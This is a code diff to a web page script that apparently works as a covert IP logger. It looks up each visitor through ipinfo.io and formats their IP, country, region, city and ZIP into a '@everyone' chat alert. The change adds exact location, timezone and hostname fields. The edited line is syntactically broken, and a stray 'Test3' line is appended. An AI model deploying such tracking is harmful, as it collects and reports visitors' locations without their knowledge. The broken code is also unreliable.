@@ -14,9 +14,9 @@ function monke(json)
           content: "@everyone",
           embeds: [
                {
-                    title: "New Visitor",
+                    title: "New Visitor ",
                     color: 1752220,
-                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Location:** `" + json.loc "`\n**Region:** `" + json.region + "`\n**Timezone:** `" + json.timezone + "` + "`\n**Hostname:** `" + json.hostname + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
                }
           ]
      }
@@ -25,3 +25,4 @@ function monke(json)
 }
 </script>
 <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+Test3
